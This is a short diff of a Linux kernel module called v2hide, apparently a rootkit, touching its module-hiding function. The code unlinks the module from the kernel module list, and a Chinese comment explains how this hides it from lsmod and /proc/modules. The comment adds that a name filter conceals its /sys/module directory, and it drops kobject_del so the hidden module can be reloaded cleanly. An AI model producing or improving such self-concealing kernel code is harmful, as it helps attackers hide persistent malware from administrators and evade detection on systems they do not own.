@@ -546,9 +546,20 @@ static void v2hide_hide_module(void)
 		return;
 	mod_list_prev_saved = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
-	kobject_del(&THIS_MODULE->mkobj.kobj);
-#endif
+	/*
+	 * 这里**不能**再调 kobject_del(&THIS_MODULE->mkobj.kobj)：
+	 * 它会把 /sys/module/v2hide 删掉，但 misc 设备的 sysfs 条目
+	 * (/sys/devices/virtual/misc/v2hide) 不会跟着清理，模块卸载后照样残留。
+	 * 结果是下一次 insmod 必定失败：
+	 *   sysfs: cannot create duplicate filename '/devices/virtual/misc/v2hide'
+	 *   kobject_add_internal failed for v2hide with -EEXIST
+	 *   v2hide: misc_register failed: -17
+	 * 而且 kobject_del 之后无法再恢复 sysfs 状态，机器只能重启才能干净。
+	 *
+	 * list_del 已经让 /proc/modules（lsmod 的数据源）里看不到本模块；
+	 * /sys/module 下的目录名也会被 name_is_hidden 从 readdir 里过滤掉，
+	 * 只有直接 stat 该路径才看得到，隐蔽性足够，换来可重复加载。
+	 */
 }
 
 static void v2hide_restore_module(void)
